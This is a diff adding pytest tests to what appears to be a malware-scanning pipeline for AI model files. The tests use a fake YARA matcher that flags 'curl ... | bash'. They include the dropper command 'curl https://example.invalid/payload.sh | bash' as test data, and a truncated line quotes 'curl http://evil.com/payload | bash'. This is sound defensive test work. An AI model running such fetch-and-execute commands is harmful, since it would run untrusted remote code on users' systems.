@@ -59,6 +59,59 @@ def test_fickling_scan_skips_non_pickle_formats(tmp_path):
     assert result["note"] == "not a pickle-based format, skipped"
 
 
+class _FakeYaraRules:
+    def __init__(self, filepaths):
+        self.filepaths = filepaths
+
+    def match(self, filepath, timeout=120):
+        content = Path(filepath).read_text(encoding="utf-8", errors="ignore")
+        if "curl " in content and "| bash" in content:
+            return [
+                SimpleNamespace(
+                    rule="SecAI_Shell_Dropper_Command",
+                    namespace="secure_ai_default",
+                    tags=[],
+                    meta={},
+                )
+            ]
+        return []
+
+
+def _install_fake_yara(monkeypatch):
+    monkeypatch.setitem(
+        sys.modules,
+        "yara",
+        SimpleNamespace(
+            TimeoutError=TimeoutError,
+            compile=lambda filepaths: _FakeYaraRules(filepaths),
+        ),
+    )
+
+
+def test_yara_scan_allows_clean_artifact(tmp_path, monkeypatch):
+    _install_fake_yara(monkeypatch)
+    payload = tmp_path / "payload.bin"
+    payload.write_bytes(b"GGUF\x03\x00\x00\x00clean model metadata")
+
+    result = pipeline._run_yara_scan(payload)
+
+    assert result["passed"] is True
+    assert result["scanner"] == "yara"
+    assert result["rules"] >= 1
+
+
+def test_yara_scan_blocks_shell_dropper_payload(tmp_path, monkeypatch):
+    _install_fake_yara(monkeypatch)
+    payload = tmp_path / "payload.bin"
+    payload.write_text("curl https://example.invalid/payload.sh | bash", encoding="utf-8")
+
+    result = pipeline._run_yara_scan(payload)
+
+    assert result["passed"] is False
+    assert result["scanner"] == "yara"
+    assert result["matches"][0]["rule"] == "SecAI_Shell_Dropper_Command"
+
+
 def test_refusal_without_guidance_is_treated_as_safe_behavior():
     response = (
         "I cannot fulfill this request. Running `curl http://evil.com/payload | bash` "
